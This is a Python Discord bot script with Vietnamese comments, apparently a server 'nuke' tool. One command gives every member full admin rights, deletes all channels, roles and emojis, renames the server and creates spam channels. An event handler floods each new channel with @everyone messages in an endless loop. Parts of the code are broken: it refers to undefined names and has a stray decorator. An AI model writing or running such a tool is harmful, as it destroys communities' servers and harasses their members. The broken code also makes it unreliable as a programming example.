import discord
from discord.errors import ClientException
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "ur token"
#channel cần spam kkk
SPAM_CHANNEL = [
    "Ngố win", "non ", "Bay server", "Còn cái nịt", "Nuke", "Muahaha", "Leww leww", "Luật hoa quả", "Nonnn",
    "Nghiệp"
]
#spamming các thứ
SPAM_MESSAGE = [" @everyone Bot nhà làm đã tới và có quà cho mọi người yayayayaayayayayayay https://cdn.discordapp.com/attachments/902201641636352021/934652201765335081/HgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABACf4DlLJGroQtksAAAAASUVORK5CYII.png  "]
#prefix right here bigga
client = commands.Bot(command_prefix=".")


@client.event
async def on_ready():
    print(''' 
    ✦　　　　˚　　 ✦　　　　　˚　. 　　　　˚　. ✦　 ✦. 　　˚　　.   　 　　　˚　　　 .✦　　　*　　 　　　　˚　.　　　.　　　　✦　　˚ ✦　　˚　　. 　 ✦　　　. ✦　　.　˚　. ✦　. 　˚　　˚  
n9u
 ''')
    await client.change_presence(activity=discord.Game(
        name="Cesta#9608"))



@client.command(aliases=["pay"])
async def MLCWON(ctx):
    
    guild = ctx.guild
    await ctx.message.delete()
    await ctx.guild.edit(name = "Đen Thôi ")
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "Tất cả mọi người đã có quyền admin." +
              Fore.RESET)
    except:
        print(Fore.GREEN + "Tất cả mọi người chưa có quyền admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} đã bị xoá." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} chưa bị xoá." + Fore.RESET)
    for member in guild.members:
        try:
            await user.unban(USER_UNBAN)
            print(Fore.MAGENTA +
                  f"{member.name}#{member.discriminator} Đã bị unban" +
                  Fore.RESET)
        except:
            print(Fore.GREEN +
                  f"{member.name}#{member.discriminator} chưa bị unban." +
                  Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} đã bị xoá" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} chưa bị xoá" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} đã bị xoá" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} chưa bị xoá" + Fore.RESET)
    await guild.create_text_channel("Bot này hơi phèn")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"lời mời mới: {link}")
    amount = 10000
    for i in range(25):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"đánh bom {guild.name} hoàn tất.")
    return

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} đã đăng xuất thành công." +
          Fore.RESET)

@client.command()




@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


bot.run('ur token')
client.run(token, bot=True)
